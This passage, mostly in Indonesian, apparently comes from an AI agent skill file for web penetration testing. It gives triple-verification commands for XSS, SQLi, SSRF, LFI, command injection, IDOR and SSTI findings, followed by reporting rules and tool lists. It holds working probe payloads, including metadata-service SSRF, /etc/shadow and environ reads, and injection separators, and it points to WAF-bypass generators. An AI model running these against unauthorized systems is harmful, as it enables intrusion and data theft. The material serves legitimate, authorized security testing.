# Jika 2+ variasi payload work → strong confirmation

# ============================================================
# VERIFICATION 3 — Clean context + sinkronisasi tool
# ============================================================
# a) Cek dengan tool BERBEDA (bukan hanya curl)
dalfox url "https://<TARGET>/search?q=<ORIGINAL_PAYLOAD>" --skip-bav -o verify3_dalfox.txt
# b) Cek di browser fresh session (tanpa cookies sebelumnya)
# c) Bandingkan response size — apakah reflection SELALU muncul?
curl -s -o /dev/null -w "%{size_download}" "https://<TARGET>/search?q=<PAYLOAD>"
curl -s -o /dev/null -w "%{size_download}" "https://<TARGET>/search?q=INNOCENT_STRING"
# Jika size SAMA → kemungkinan static/template reflection, bukan true XSS

# ============================================================
# KLASIFIKASI HASIL
# ============================================================
# 3/3 ✅ = CONFIRMED XSS → masuk reporting
# 2/3 ✅ = SUSPECT → flag "Needs Manual Verification", cek di Burp
# 1/3 ✅ = LIKELY FALSE POSITIVE → discard
# 0/3 ✅ = FALSE POSITIVE → discard, catat payload yang dicoba
```

**Ciri-ciri FALSE POSITIVE XSS yang sering terjadi:**
- Payload masuk ke response tapi dalam context yang TIDAK bisa execute (di dalam comment HTML, attribute yang di-quote dengan benar, atau text node biasa)
- Reflected tapi ter-encode otomatis (`<` → `&lt;`) — ini BUKAN XSS
- Response SELALU mengandung string tertentu terlepas dari input (template static)
- Hanya work di SATU payload tertentu tapi variasi lain gagal

---

### 4.13.2 Triple Verification — SQL Injection (WSTG-INPV-05)

```bash
# ============================================================
# VERIFICATION 1 — Reproduce dengan sqlmap SAMA
# ============================================================
# Jalankan ulang exact command sqlmap yang pertama kali berhasil
sqlmap -u "https://<TARGET>/page?id=1" --batch --level=3 --risk=2 --flush-session
# HARUS menemukan injection point yang sama

# ============================================================
# VERIFICATION 2 — Variasi teknik BERBEDA
# ============================================================
# a) Cek dengan boolean-based (jika awalnya error-based)
sqlmap -u "https://<TARGET>/page?id=1" --batch --technique=BEU --level=3

# b) Manual verification — bandingkan response
# Request normal:
curl -s "https://<TARGET>/page?id=1" | md5sum
# Request dengan AND 1=1 (true):
curl -s "https://<TARGET>/page?id=1 AND 1=1--" | md5sum
# Request dengan AND 1=2 (false):
curl -s "https://<TARGET>/page?id=1 AND 1=2--" | md5sum
# TRUE dan NORMAL harus SAMA, FALSE harus BEDA

# c) Time-based verification
curl -s -o /dev/null -w "%{time_total}" "https://<TARGET>/page?id=1"
curl -s -o /dev/null -w "%{time_total}" "https://<TARGET>/page?id=1 AND SLEEP(5)--"
# Beda harus ~5 detik

# ============================================================
# VERIFICATION 3 — Clean session + different tool
# ============================================================
# a) Flush session sqlmap, scan ulang dari nol
sqlmap -u "https://<TARGET>/page?id=1" --batch --flush-session --level=3 --risk=2

# b) Manual test tanpa sqlmap (pure curl)
curl -s "https://<TARGET>/page?id=1'" | grep -i "error\|syntax\|mysql\|sql\|warning"
curl -s "https://<TARGET>/page?id=1''" | grep -i "error\|syntax\|mysql\|sql\|warning"

# c) Cek apakah error message SELALU muncul (bukan hanya untuk injection)
curl -s "https://<TARGET>/page?id=NONSENSE_RANDOM_12345" | grep -i "error"
# Jika error juga muncul untuk random input → kemungkinan app error handling, bukan SQLi

# ============================================================
# KLASIFIKASI HASIL
# ============================================================
# 3/3 ✅ = CONFIRMED SQLi → masuk reporting
# 2/3 ✅ = SUSPECT → flag "Needs Manual Verification"
# 1/3 ✅ = LIKELY FALSE POSITIVE → discard
# 0/3 ✅ = FALSE POSITIVE → discard
```

**Ciri-ciri FALSE POSITIVE SQLi yang sering terjadi:**
- sqlmap bilang "injectable" tapi manual test tidak bisa reproduce boolean/time difference
- Error message muncul untuk SEMUA input (termasuk random string) — ini app error handling, bukan SQLi
- WAF yang menghalangi di verification ke-2/ke-3 → temuan dianggap "blocked by WAF", bukan confirmed
- sqlmap level 5/risk 3 sering false positive — selalu verifikasi manual

---

### 4.13.3 Triple Verification — SSRF (WSTG-INPV-19)

```bash
# ============================================================
# VERIFICATION 1 — Reproduce dengan payload internal SAMA
# ============================================================
curl -s "https://<TARGET>/fetch?url=http://127.0.0.1" | head -20
# HARUS menunjukkan response dari internal server

# ============================================================
# VERIFICATION 2 — Variasi target internal BERBEDA
# ============================================================
# a) Ganti target — bukan hanya 127.0.0.1
curl -s "https://<TARGET>/fetch?url=http://localhost" | head -20
curl -s "https://<TARGET>/fetch?url=http://0.0.0.0" | head -20
curl -s "https://<TARGET>/fetch?url=http://169.254.169.254/latest/meta-data/" | head -20

# b) Time-based verification (jika response tidak jelas)
curl -s -o /dev/null -w "%{time_total}" "https://<TARGET>/fetch?url=http://127.0.0.1"
curl -s -o /dev/null -w "%{time_total}" "https://<TARGET>/fetch?url=http://192.0.2.1"  # non-routable
# Jika 127.0.0.1 cepat tapi 192.0.2.1 lambat/timeout → SSRF confirmed

# c) Out-of-band verification (paling reliable)
# Gunakan Burp Collaborator atau interactsh
curl -s "https://<TARGET>/fetch?url=http://YOUR_COLLABORATOR.burpcollaborator.net"
# Cek DNS/HTTP callback di Collaborator

# ============================================================
# VERIFICATION 3 — Bypass + clean request
# ============================================================
# a) Cek apakah ada WAF yang block di request ke-3
curl -s "https://<TARGET>/fetch?url=http://127.0.0.1" -H "Cookie: session=<CLEAN_COOKIE>"

# b) Cek dengan encoding bypass
curl -s "https://<TARGET>/fetch?url=http://0x7f000001"
curl -s "https://<TARGET>/fetch?url=http://2130706433"

# c) Cek apakah response benar-benar dari internal (bukan error page)
curl -s "https://<TARGET>/fetch?url=http://127.0.0.1" | grep -i "root\|apache\|nginx\|internal\|admin"
# Jika hanya menampilkan error page generik → bukan SSRF

# ============================================================
# KLASIFIKASI HASIL
# ============================================================
# 3/3 ✅ = CONFIRMED SSRF → masuk reporting
# 2/3 ✅ = SUSPECT → flag "Needs Manual Verification"
# 1/3 ✅ = LIKELY FALSE POSITIVE → discard
# 0/3 ✅ = FALSE POSITIVE → discard
```

**Ciri-ciri FALSE POSITIVE SSRF:**
- Response menunjukkan error page yang SAMA untuk SEMUA URL (internal maupun external)
- Aplikasi melakukan redirect ke URL, bukan fetch server-side
- Response code 200 tapi content kosong atau placeholder
- Tidak ada perbedaan response time antara internal dan external

---

### 4.13.4 Triple Verification — LFI (WSTG-INPV-12)

```bash
# ============================================================
# VERIFICATION 1 — Reproduce dengan payload SAMA
# ============================================================
curl -s "https://<TARGET>/page?file=../../../../etc/passwd" | grep "root:"
# HARUS menunjukkan isi file

# ============================================================
# VERIFICATION 2 — Variasi file target BERBEDA
# ============================================================
# a) Baca file lain yang seharusnya ada
curl -s "https://<TARGET>/page?file=../../../../etc/hostname"
curl -s "https://<TARGET>/page?file=../../../../etc/hosts"
curl -s "https://<TARGET>/page?file=../../../../proc/version"

# b) Cek dengan path traversal berbeda
curl -s "https://<TARGET>/page?file=....//....//....//etc/passwd"
curl -s "https://<TARGET>/page?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"

# c) Pastikan bukan halaman statis yang kebetulan mengandung "root:"
curl -s "https://<TARGET>/page?file=INNOCENT_FILE" | grep "root:"
# Jika "root:" juga muncul untuk innocent input → FALSE POSITIVE

# ============================================================
# VERIFICATION 3 — File existence proof
# ============================================================
# a) Baca file yang BERBEDA dari /etc/passwd — proof bahwa ini benar-benar file read
curl -s "https://<TARGET>/page?file=../../../../etc/shadow" 2>&1 | head -5
# /etc/shadow seharusnya permission denied atau berisi hash

# b) Baca file application-specific
curl -s "https://<TARGET>/page?file=../../../../proc/self/environ" | grep -i "PATH\|HOME"
curl -s "https://<TARGET>/page?file=../../../../proc/self/cmdline"

# c) Cek perbedaan response size antara file yang ada vs tidak ada
curl -s -o /dev/null -w "%{size_download}" "https://<TARGET>/page?file=../../../../etc/passwd"
curl -s -o /dev/null -w "%{size_download}" "https://<TARGET>/page?file=../../../../etc/nonexistent_file_xyz"
# Size harus BEDA → file benar-benar dibaca

# ============================================================
# KLASIFIKASI HASIL
# ============================================================
# 3/3 ✅ = CONFIRMED LFI → masuk reporting
# 2/3 ✅ = SUSPECT → flag "Needs Manual Verification"
# 1/3 ✅ = LIKELY FALSE POSITIVE → discard
# 0/3 ✅ = FALSE POSITIVE → discard
```

**Ciri-ciri FALSE POSITIVE LFI:**
- Content "root:" muncul tapi itu bagian dari halaman HTML biasa (misalnya tentang root user di documentation)
- Response SELALU sama terlepas dari path yang dimasukkan
- File yang seharusnya tidak bisa diakses (shadow) tidak muncul
- Hanya /etc/passwd yang "work" tapi file lain tidak — kemungkinan cached/hardcoded

---

### 4.13.5 Triple Verification — Command Injection (WSTG-INPV-12)

```bash
# ============================================================
# VERIFICATION 1 — Reproduce dengan payload SAMA
# ============================================================
curl -s "https://<TARGET>/page?cmd=test;id" | grep "uid="
# HARUS menunjukkan output id command

# ============================================================
# VERIFICATION 2 — Variasi command BERBEDA
# ============================================================
# a) Jalankan command berbeda
curl -s "https://<TARGET>/page?cmd=test;whoami"  # output username berbeda
curl -s "https://<TARGET>/page?cmd=test;hostname" # output hostname
curl -s "https://<TARGET>/page?cmd=test;pwd"      # output working directory

# b) Time-based verification (paling reliable untuk blind)
curl -s -o /dev/null -w "%{time_total}" "https://<TARGET>/page?cmd=test"
curl -s -o /dev/null -w "%{time_total}" "https://<TARGET>/page?cmd=test;sleep+5"
# Beda harus ~5 detik

# c) Cek dengan separator berbeda
curl -s "https://<TARGET>/page?cmd=test|id"
curl -s "https://<TARGET>/page?cmd=test||id"
curl -s "https://<TARGET>/page?cmd=test&&id"
curl -s "https://<TARGET>/page?cmd=test\`id\`"

# ============================================================
# VERIFICATION 3 — Clean request + different vector
# ============================================================
# a) Bersihkan cookies/headers, kirim ulang
curl -s "https://<TARGET>/page?cmd=test;id" -H "Cookie: "

# b) Cek apakah output SELALU muncul (bukan hanya untuk injection)
curl -s "https://<TARGET>/page?cmd=INNOCENT_RANDOM_STRING" | grep "uid="
# Jika uid= juga muncul untuk innocent input → FALSE POSITIVE

# c) Out-of-band verification
curl -s "https://<TARGET>/page?cmd=test;nslookup+YOUR_DOMAIN"
# Cek DNS query di server kamu

# ============================================================
# KLASIFIKASI HASIL
# ============================================================
# 3/3 ✅ = CONFIRMED CMDi → masuk reporting
# 2/3 ✅ = SUSPECT → flag "Needs Manual Verification"
# 1/3 ✅ = LIKELY FALSE POSITIVE → discard
# 0/3 ✅ = FALSE POSITIVE → discard
```

---

### 4.13.6 Triple Verification — IDOR / BOLA (WSTG-AUTH-04)

```bash
# ============================================================
# VERIFICATION 1 — Reproduce dengan SAMA user context
# ============================================================
# Pastikan bisa akses resource user B dengan token user A
curl -s -H "Authorization: Bearer <TOKEN_USER_A>" "https://<TARGET>/api/users/<USER_B_ID>/profile" | jq .
# HARUS mengembalikan data user B

# ============================================================
# VERIFICATION 2 — Variasi ID BERBEDA
# ============================================================
# a) Cek dengan user ID lain (C, D, E...)
curl -s -H "Authorization: Bearer <TOKEN_USER_A>" "https://<TARGET>/api/users/<USER_C_ID>/profile"
curl -s -H "Authorization: Bearer <TOKEN_USER_A>" "https://<TARGET>/api/users/<USER_D_ID>/profile"

# b) Cek di endpoint lain (jika ada)
curl -s -H "Authorization: Bearer <TOKEN_USER_A>" "https://<TARGET>/api/users/<USER_B_ID>/orders"
curl -s -H "Authorization: Bearer <TOKEN_USER_A>" "https://<TARGET>/api/users/<USER_B_ID>/settings"

# c) Cek dengan parameter berbeda (id, user_id, uid)
curl -s -H "Authorization: Bearer <TOKEN_USER_A>" "https://<TARGET>/api/profile?user_id=<USER_B_ID>"

# ============================================================
# VERIFICATION 3 — Negative test + clean context
# ============================================================
# a) Tanpa token — harusnya 401/403
curl -s -o /dev/null -w "%{http_code}" "https://<TARGET>/api/users/<USER_B_ID>/profile"
# HARUS 401 atau 403

# b) Dengan token INVALID — harusnya 401
curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer INVALID_TOKEN" "https://<TARGET>/api/users/<USER_B_ID>/profile"

# c) Cek apakah ada authorization check di level lain
# Mungkin data yang dikembalikan SAMA untuk semua user (public profile) → bukan IDOR
curl -s -H "Authorization: Bearer <TOKEN_USER_A>" "https://<TARGET>/api/users/<USER_B_ID>/profile" | jq '.email, .phone, .ssn'
# Jika field sensitif (email, phone, ssn) ikut ter-expose → CONFIRMED IDOR
# Jika hanya field public (name, avatar) → LOW severity atau bukan IDOR

# ============================================================
# KLASIFIKASI HASIL
# ============================================================
# 3/3 ✅ = CONFIRMED IDOR → masuk reporting
# 2/3 ✅ = SUSPECT → flag "Needs Manual Verification"
# 1/3 ✅ = LIKELY FALSE POSITIVE → discard
# 0/3 ✅ = FALSE POSITIVE → discard
```

**Ciri-ciri FALSE POSITIVE IDOR:**
- Data yang dikembalikan adalah data PUBLIC (name, avatar) — bukan sensitive
- Semua user bisa melihat data yang sama (fitur, bukan bug)
- API menggunakan UUID yang tidak bisa ditebak (bukan sequential ID)
- Response 200 tapi data kosong atau placeholder

---

### 4.13.7 Triple Verification — SSTI (WSTG-INPV-18)

```bash
# ============================================================
# VERIFICATION 1 — Mathematical operation SAMA
# ============================================================
curl -s "https://<TARGET>/page?name={{7*7}}" | grep "49"
# HARUS menunjukkan 49 di response

# ============================================================
# VERIFICATION 2 — Variasi expression BERBEDA
# ============================================================
# a) Operasi berbeda
curl -s "https://<TARGET>/page?name={{7*8}}" | grep "56"
curl -s "https://<TARGET>/page?name={{999*999}}" | grep "998001"

# b) String operation
curl -s "https://<TARGET>/page?name={{'A'*5}}" | grep "AAAAA"

# c) Detection polyglot — cek multiple engines
curl -s "https://<TARGET>/page?name={{7*7}}" | grep "49"     # Jinja2/Twig
curl -s "https://<TARGET>/page?name=\${7*7}" | grep "49"     # Freemarker/Mako
curl -s "https://<TARGET>/page?name=<%=7*7%>" | grep "49"    # ERB

# ============================================================
# VERIFICATION 3 — Negative test + payload detection
# ============================================================
# a) Cek apakah "49" SELALU muncul di response (template/static)
curl -s "https://<TARGET>/page?name=INNOCENT_STRING" | grep "49"
# Jika 49 juga muncul → FALSE POSITIVE

# b) Cek dengan expression yang seharusnya ERROR
curl -s "https://<TARGET>/page?name={{7*'" | grep -i "error\|exception\|traceback"
# Jika ada error message → template engine confirmed

# c) Pastikan bukan JavaScript evaluation (client-side)
# Kirim request via curl (server-side) — jika hasilnya 49, ini SSTI
# Jika hanya muncul di browser → kemungkinan client-side template, bukan SSTI

# ============================================================
# KLASIFIKASI HASIL
# ============================================================
# 3/3 ✅ = CONFIRMED SSTI → masuk reporting
# 2/3 ✅ = SUSPECT → flag "Needs Manual Verification"
# 1/3 ✅ = LIKELY FALSE POSITIVE → discard
# 0/3 ✅ = FALSE POSITIVE → discard
```

---

### 4.13.8 Verification Checklist Template (untuk SEMUA vuln type)

Setiap temuan WAJIB diisi checklist ini sebelum masuk reporting:

```
📋 VERIFICATION CHECKLIST — [VULN_TYPE]
- Target          : [URL/endpoint]
- Payload Awal    : [payload pertama yang berhasil]

- VERIFICATION 1  : [ ] PASS / [ ] FAIL
  - Command       : [exact command yang dijalankan]
  - Result        : [apa yang terjadi]
  - Evidence      : [response snippet / screenshot]

- VERIFICATION 2  : [ ] PASS / [ ] FAIL
  - Variasi       : [payload/teknik berbeda yang dicoba]
  - Result        : [apa yang terjadi]
  - 2nd Payload   : [payload kedua yang dicoba]
  - 3rd Payload   : [payload ketiga yang dicoba]

- VERIFICATION 3  : [ ] PASS / [ ] FAIL
  - Clean Context : [ ] fresh cookies / [ ] different tool / [ ] OOB
  - Negative Test : [ ] input innocent → tidak ada false trigger
  - Result        : [apa yang terjadi]

- HASIL AKHIR     :
  [ ] CONFIRMED (3/3 PASS) → masuk Fase 5 Reporting
  [ ] SUSPECT (2/3 PASS) → flag "Needs Manual Verification"
  [ ] FALSE POSITIVE (≤1/3 PASS) → discard, catat alasan

- Catatan         : [catatan tambahan tentang verifikasi]
```

---

### 4.13.9 Common False Positive Patterns — Quick Reference

| Vuln Type | Ciri-ciri False Positive | Cara Cepat Verifikasi |
|---|---|---|
| **XSS** | Payload reflected tapi ter-encode (`<` → `&lt;`), atau di context yang tidak execute (HTML comment, quoted attribute) | Cek apakah `<script>` benar-benar jadi tag HTML, bukan text literal |
| **SQLi** | Error muncul untuk SEMUA input (termasuk random string), sqlmap level 5 terlalu aggressive | Kirim random string — jika error juga muncul, ini app error handling |
| **SSRF** | Response SAMA untuk internal dan external URL, atau response kosong | Bandingkan response content dan time antara internal vs external |
| **LFI** | "root:" muncul tapi itu bagian dari HTML page, bukan isi /etc/passwd | Baca file lain (/etc/hostname) — jika juga gagal, /etc/passwd kemungkinan cached |
| **CMDi** | Output command muncul untuk SEMUA input (termasuk innocent string) | Kirim innocent string — jika output command juga muncul, ini template/static |
| **IDOR** | Data yang ter-expose adalah data PUBLIC (name, avatar), bukan sensitive | Cek apakah field sensitif (email, phone, ssn, password) ikut ter-expose |
| **SSTI** | Angka "49" muncul tapi itu bagian dari konten halaman | Kirim innocent string — jika "49" juga muncul, ini static content |
| **Open Redirect** | Redirect terjadi tapi hanya untuk URL tertentu, atau ada warning page | Cek tanpa warning — apakah redirect langsung terjadi? |
| **CORS** | Header `Access-Control-Allow-Origin` statis, bukan dynamic reflection | Ganti origin — jika header TIDAK berubah, ini static CORS config (SAFE) |

---

### 4.13.10 Kapan TIDAK Perlu Triple Verification

Ada pengecualian untuk beberapa temuan yang sudah pasti:

1. **Missing Security Headers** — ini fakta konfigurasi, bukan exploitation. Cukup cek satu kali.
2. **TLS/SSL Weakness** — cipher suite atau TLS version. Cukup cek satu kali.
3. **Information Disclosure** — misalnya .git/config exposed, .env file exposed. File-nya ada atau tidak.
4. **Default Credentials** — login berhasil atau tidak. Tapi tetap cek apakah itu account test/dev.
5. **Software Version Disclosure** — banner visible atau tidak.

Untuk semua temuan exploitation-based (XSS, SQLi, SSRF, LFI, CMDi, SSTI, IDOR) → **WAJIB Triple Verification**.

---

## Fase 5 — Reporting

**Tujuan**: Mendokumentasikan temuan secara profesional dengan CVSS scoring dan rekomendasi perbaikan.

**Referensi lengkap**: Baca `references/reporting_template.md`

### 5.1 PoC Report Generator Script

```bash
# Interactive mode — isi detail step by step
python scripts/poc_report_generator.py

# CLI mode — generate report langsung
python scripts/poc_report_generator.py \
  --title "Stored XSS via Profile Bio" \
  --vuln-type xss \
  --subtype stored \
  --url "https://example.com/profile" \
  --parameter "bio" \
  --method POST \
  --payload '<script>alert(document.domain)</script>' \
  --impact "Attacker can steal session cookies of other users" \
  --steps "1. Login to account\n2. Go to profile settings\n3. Insert XSS payload in bio field\n4. Save profile\n5. Visit profile page" \
  --output report.md

# Dari JSON file
python scripts/poc_report_generator.py --from-json finding.json --output report.md

# Full pentest report (multiple findings)
python scripts/poc_report_generator.py --full-report --from-json findings.json --output pentest_report.md

# List vulnerability types dan CVSS default
python scripts/poc_report_generator.py --list-types
```

### 5.2 CVSS v3.1 Quick Scoring

| Score | Severity | Emoji |
|---|---|---|
| 9.0 - 10.0 | 🔴 Critical | Immediate fix |
| 7.0 - 8.9 | 🟠 High | Fix within 7 days |
| 4.0 - 6.9 | 🟡 Medium | Fix within 30 days |
| 0.1 - 3.9 | 🟢 Low | Fix when possible |
| 0.0 | ⚪ Info | Advisory only |

### 5.3 Mapping ke OWASP Top 10 (2021)

| OWASP Category | Vulnerability Types |
|---|---|
| A01: Broken Access Control | IDOR, BOLA, Path Traversal, CSRF, Open Redirect |
| A02: Cryptographic Failures | Sensitive Data Exposure, Weak TLS |
| A03: Injection | SQLi, XSS, Command Injection, XXE |
| A05: Security Misconfiguration | Missing Headers, Debug Mode, Default Creds |
| A07: Identification & Auth Failures | Broken Auth, Session Fixation, Weak Password |
| A08: Software & Data Integrity | Insecure Deserialization |
| A10: SSRF | Server-Side Request Forgery |

### 5.4 Format Report per Platform

**Standard Pentest Report**: Gunakan `--full-report` pada poc_report_generator.py

**HackerOne**: Summary → Steps to Reproduce → Supporting Material → Impact

**Bugcrowd**: Title → URL → Description → Steps → PoC → Suggested Fix

### 5.5 Dokumentasi Reporting

```
📋 Report Complete:
- Fase            : 5 — Reporting
- Total Findings  : [jumlah]
- Critical        : [jumlah]
- High            : [jumlah]
- Medium          : [jumlah]
- Low             : [jumlah]
- Report File     : [path ke file report]
- Status          : [draft / submitted / accepted]
```

### 5.6 Triple Verification — Fase 5 (Reporting)

Sebelum submit report, final validation untuk memastikan kualitas report:

```
📋 VERIFICATION CHECKLIST — Fase 5 (Reporting)

- V1: EVIDENCE LENGKAP?
  [ ] Setiap finding punya screenshot/response proof
  [ ] Payload yang work tertulis dengan exact
  [ ] Steps to reproduce bisa diikuti orang lain
  [ ] Tidak ada finding tanpa evidence

- V2: CVSS AKURAT?
  [ ] Score sesuai dampak aktual (tidak over-rate/under-rate)
  [ ] Attack vector benar (Network/Adjacent/Local/Physical)
  [ ] Impact (CIA) sesuai — contoh: XSS = Confidentiality Low, bukan High
  [ ] Scope change dihitung jika attacker bisa akses komponen lain
  [ ] Cross-check: https://www.first.org/cvss/calculator/3.1

- V3: REMEDIATION ACTIONABLE?
  [ ] Setiap finding punya rekomendasi perbaikan spesifik
  [ ] Bukan hanya "fix this" — tapi HOW to fix (code snippet, config change)
  [ ] Mapping ke OWASP/CWE yang benar
  [ ] Prioritas perbaikan sesuai severity

- FINAL CHECK:
  [ ] Tidak ada typo/grammar error yang mengubah makna
  [ ] Format konsisten (HackerOne/Bugcrowd/custom format)
  [ ] Tidak ada data sensitif yang ter-expose (token, password, PII)
  [ ] Report sudah di-review sekali lagi sebelum submit

- HASIL: 4/4 ✅ = READY TO SUBMIT
          3/4 ⚠️ = FIX dulu yang missing
          ≤2 ❌ = JANGAN SUBMIT — report belum layak
```

---

## Aturan Umum Skill Ini

1. **Selalu ikuti urutan 5 fase** — kecuali user secara eksplisit request jump ke fase tertentu
2. **State tracking** — di setiap respons, sebutkan:
   - Fase yang sedang aktif
   - WSTG ID yang relevan
   - Apa langkah selanjutnya
3. **Disclaimer etis** — ingatkan tentang otorisasi dan legalitas di awal sesi
4. **Command yang tepat** — berikan exact Kali Linux commands yang bisa langsung dijalankan
5. **SecLists reference** — gunakan wordlist dari `/usr/share/seclists/` untuk payload dan fuzzing
6. **WAF awareness** — jika payload diblokir, sarankan teknik bypass dari `references/waf_bypass_techniques.md`
7. **Gunakan script otomatis** — referensikan script di `scripts/` untuk efisiensi
8. **Bahasa Indonesia** — gunakan Bahasa Indonesia dengan istilah teknis dalam Bahasa Inggris
9. **Jelaskan teknis** — sertakan penjelasan teknis untuk setiap payload dan teknik (mengapa ini bekerja)
10. **PoC minimal** — buat proof of concept yang membuktikan vulnerability tanpa menyebabkan kerusakan
11. **Dokumentasikan setiap fase** — catat temuan dalam format terstruktur
12. **CVSS scoring** — setiap vulnerability harus memiliki CVSS score dan severity rating
13. **Remediation** — selalu sertakan rekomendasi perbaikan yang actionable, mapping ke OWASP Top 10 / ASVS
14. **Jangan membuat asumsi scope** — jika target belum jelas, tanyakan dulu sebelum memberikan command
15. **TRIPLE VERIFICATION WAJIB DI SEMUA FASE** — setiap fase (Planning, Recon, Scanning, Exploitation, Reporting) WAJIB melalui Triple Verification sebelum lanjut ke fase berikutnya. Detail: Section 1.4, 2.5, 3.10, 4.13, 5.6. Jangan pernah report temuan yang baru sekali reproduce.

---

## Tools yang Tersedia di Sistem

| Tool | Kategori | Fungsi Utama |
|---|---|---|
| **subfinder** | Subdomain Recon | Passive subdomain discovery tool |
| **assetfinder** | Subdomain Recon | Find subdomains and assets related to a domain |
| **crtsh** | Subdomain Recon | Query crt.sh certificate transparency logs |
| **chaos** | Subdomain Recon | Query projectdiscovery chaos API for subdomains |
| **github-subdomains** | Subdomain Recon | Find subdomains using GitHub API |
| **shosubgo** | Subdomain Recon | Find subdomains using Shodan |
| **subzy** | Subdomain Recon | Subdomain takeover vulnerability scanner |
| **sublister** | Subdomain Recon | Subdomain enumeration tool |
| **nmap** | Port Scanning | Network scanner & service detection |
| **naabu** | Port Scanning | Fast port scanner written in Go |
| **rustscan** | Port Scanning | Fast port scanner using Rust |
| **httprobe** | HTTP Probe | Take a list of domains and probe for working HTTP/HTTPS servers |
| **httpx** | HTTP Probe | Fast and multi-purpose HTTP toolkit |
| **katana** | HTTP Crawler | Next-generation web crawling and spidering tool |
| **hakrawler** | HTTP Crawler | Fast web crawler for gathering URLs and JavaScript files |
| **gau** | URL Gathering | Fetch known URLs from AlienVault, Wayback, and Common Crawl |
| **waybackurls** | URL Gathering | Fetch URLs from Wayback Machine for a domain |
| **nuclei** | Vuln Scanning | Fast and customizable template-based vulnerability scanner |
| **dalfox** | Vuln Scanning | Parameter analysis and XSS scanner |
| **xsstrike** | Vuln Scanning | XSS scanner and payload generator |
| **wpscan** | Vuln Scanning | WordPress vulnerability scanner |
| **nikto** | Vuln Scanning | Web server vulnerability scanner |
| **nessus** | Vuln Scanning | Vulnerability assessment tool |
| **burp** | Intercept Proxy | Burp Suite GUI for manual testing and interception |
| **zap** | Intercept Proxy | OWASP ZAP intercepting proxy and web scanner |
| **ffuf** | Web Fuzzing | Fast web fuzzer (directory, parameter, vhost discovery) |
| **gobuster** | Web Fuzzing | Directory, DNS, and VHost brute-forcing tool |
| **dirb** | Web Fuzzing | URL-based directory brute-forcer |
| **dirsearch** | Web Fuzzing | Advanced web path scanner |
| **dirhunt** | Web Fuzzing | Search web directories without brute-forcing |
| **paramspider** | Parameter Mining | Mine parameters from web archives for a domain |
| **arjun** | Parameter Mining | HTTP parameter discovery suite |
| **unfurl** | URL Parsing | Format and decompose URLs to extract paths, keys, values |
| **urldedupe** | URL Parsing | Tool to deduplicate URLs with similar parameters |
| **sqlmap** | Exploitation | SQL Injection automation tool |
| **sqlmapapi** | Exploitation | API client/server interface for sqlmap |
| **qsreplace** | Payload Injection | Replace query string values in URLs with custom payloads |
| **kxss** | Payload Injection | Find parameters reflected in response headers/bodies |
| **bhedak** | Payload Injection | Inject payloads into parameters and URLs |
| **normalizer** | Payload Injection | Normalize URL paths and characters |
| **freq** | Analysis | Text frequency analyst tool |
| **gf** | Analysis | Wrapper around grep for finding patterns (SSRF, XSS, SQLi, etc.) |
| **lucek** | Analysis | Custom text/payload helper |
| **nokogiri** | Analysis | HTML/XML parser library |
| **msfconsole** | Exploitation | Metasploit framework command line console |
| **msfvenom** | Exploitation | Metasploit standalone payload generator |
| **msfd** | Exploitation | Metasploit framework daemon |
| **msfdb** | Exploitation | Metasploit framework database manager |
| **msfrpc** | Exploitation | Metasploit RPC client wrapper |
| **msfrpcd** | Exploitation | Metasploit RPC daemon |
| **msfupdate** | Exploitation | Metasploit framework update utility |
| **msf-json-rpc.ru** | Exploitation | Metasploit JSON RPC config/runner |
| **msf-ws.ru** | Exploitation | Metasploit websocket interface |
| **flask-unsign** | Exploitation | Crack/sign Flask session cookies |
| **netcat** | Exploitation | TCP/UDP network utility (nc) |
| **hashcat** | Exploitation | Advanced password recovery/cracking tool |
| **anew** | Utility | Append lines from stdin to a file only if they don't exist |
| **proxy-db** | Utility | Proxy database helper / rotator |

---

## SecLists Reference Paths

| Kategori | Path |
|---|---|
| **XSS Payloads** | `/usr/share/seclists/Fuzzing/XSS/` |
| **SQLi Payloads** | `/usr/share/seclists/Fuzzing/Databases/SQLi/` |
| **LFI Payloads** | `/usr/share/seclists/Fuzzing/LFI/` |
| **Command Injection** | `/usr/share/seclists/Fuzzing/command-injection-commix.txt` |
| **Login Bypass** | `/usr/share/seclists/Fuzzing/login_bypass.txt` |
| **Web Dirs (common)** | `/usr/share/seclists/Discovery/Web-Content/common.txt` |
| **Web Dirs (medium)** | `/usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt` |
| **API Endpoints** | `/usr/share/seclists/Discovery/Web-Content/api/` |
| **DNS Subdomains** | `/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt` |
| **Parameters** | `/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt` |
| **Passwords** | `/usr/share/seclists/Passwords/` |
| **Usernames** | `/usr/share/seclists/Usernames/` |

---

## Script & Document Reference

| File | Fungsi | Details | Usage / Commands |
|---|---|---|---|
| `scripts/payload_generator.py` | Generate & obfuscate payload untuk WAF bypass | **900+ built-in, 30K+ SecLists** | `python scripts/payload_generator.py --type xss --waf-bypass --load-seclists` |
| `scripts/bugbounty_exploiter.py` | **All-in-One automation** — Recon → Fuzz → Exploit → Bypass → Report | **500+ payload WAF bypass, 5 fase otomatis** | `python scripts/bugbounty_exploiter.py --target https://example.com` |
| `scripts/waf_bypass_generator.py` | Generate payload WAF bypass spesifik | **500+ payload obfuscated** | `python scripts/waf_bypass_generator.py --type xss --output xss_payloads.txt` |
| `scripts/recon_automation.py` | Automasi recon (subfinder, nmap, whatweb, ffuf) | — | `python scripts/recon_automation.py --target example.com` |
| `scripts/poc_report_generator.py` | Auto-generate PoC report Markdown (10 vuln types) | — | `python scripts/poc_report_generator.py --vuln-type xss --output report.md` |
| [bugbounty_exploiter.md](references/bugbounty_exploiter.md) | Dokumentasi workflow exploitation komprehensif | **5 fase + tips & trik** | Referensi lengkap cara penggunaan |
| [cwe_checklist.md](references/cwe_checklist.md) | Checklist klasifikasi kerentanan CWE lengkap | **140+ CWE Classifications** | Verifikasi & Check-off setelah pengujian kerentanan |
| [reducing_false_positives.md](references/reducing_false_positives.md) | Panduan menguji & meminimalkan false positive | **6 Strategi Verifikasi Manual & AI** | Terapkan sebelum reporting / validasi |

### Payload Generator — Vulnerability Types

| Type | Built-in | SecLists | Contexts |
|---|---|---|---|
| `xss` | 180 | ~30,974 | html, attribute, javascript, url, dom, waf_bypass |
| `sqli` | 324 | ~1,427 | generic, union, error_based, time_blind, boolean_blind, waf_bypass, stacked, nosql |
